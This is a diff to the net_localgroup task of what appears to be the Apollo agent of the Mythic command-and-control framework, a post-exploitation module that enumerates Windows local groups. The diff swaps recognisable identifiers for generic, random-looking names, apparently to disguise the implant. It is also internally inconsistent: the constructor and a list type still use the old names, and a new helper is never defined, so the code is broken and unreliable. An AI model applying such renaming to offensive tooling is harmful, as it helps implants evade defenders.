@@ -6,10 +6,10 @@
 
 #if NET_LOCALGROUP
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -17,12 +17,12 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class net_localgroup : Tasking
+    public class PhantomValidatorBE55 : Tasking
     {
         #region typedefs
 
         [DataContract]
-        internal struct NetLocalGroup
+        internal struct DynamicDispatcherC613
         {
             [DataMember(Name = "computer_name")]
             public string ComputerName;
@@ -35,7 +35,7 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct LocalGroupUsersInfo
+        public struct EfficientWorkerF4FA
         {
             public IntPtr name;
             public IntPtr comment;
@@ -70,7 +70,7 @@ namespace Tasks
          */
         #endregion
 
-        public net_localgroup(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public net_localgroup(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pNetLocalGroupEnum = _agent.GetApi().GetLibraryFunction<NetLocalGroupEnum>(Library.SAMCLI, "NetLocalGroupEnum");
             _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
@@ -88,7 +88,7 @@ namespace Tasks
             IntPtr handle = IntPtr.Zero;
             List<NetLocalGroup> results = new List<NetLocalGroup>();
             string serverName = _data.Parameters.Trim();
-            if (string.IsNullOrEmpty(serverName))
+            if (ValidationHelper.IsStringEmpty(serverName))
             {
                 serverName = Environment.GetEnvironmentVariable("COMPUTERNAME");
             }
